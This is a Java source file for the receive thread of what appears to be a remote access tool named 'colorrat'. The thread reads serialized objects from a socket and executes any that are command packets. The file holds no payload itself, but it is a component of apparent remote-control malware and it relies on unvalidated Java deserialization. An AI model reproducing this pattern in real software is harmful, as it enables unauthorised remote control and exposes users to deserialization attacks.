package eu.aragonapp.colorrat.network.thread.types;

import eu.aragonapp.colorrat.ColorClient;
import eu.aragonapp.colorrat.network.packet.Packet;
import eu.aragonapp.colorrat.network.thread.ColorThread;

import java.io.EOFException;
import java.io.IOException;
import java.net.SocketException;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class ReceiveThread extends ColorThread {

    public ReceiveThread() {
        super("Receive-Thread");
    }

    @Override
    public void update() {
        try {
            final Object object = ColorClient.getInstance().getInputStream().readObject();

            if (object == null) return;
            if (!(object instanceof Packet)) return;

            ((Packet) object).execute(null);
        } catch (SocketException | NullPointerException | EOFException ex) {
            ColorClient.getInstance().stop();
        } catch (ClassNotFoundException | IOException e) {
            e.printStackTrace();
        }
    }
}
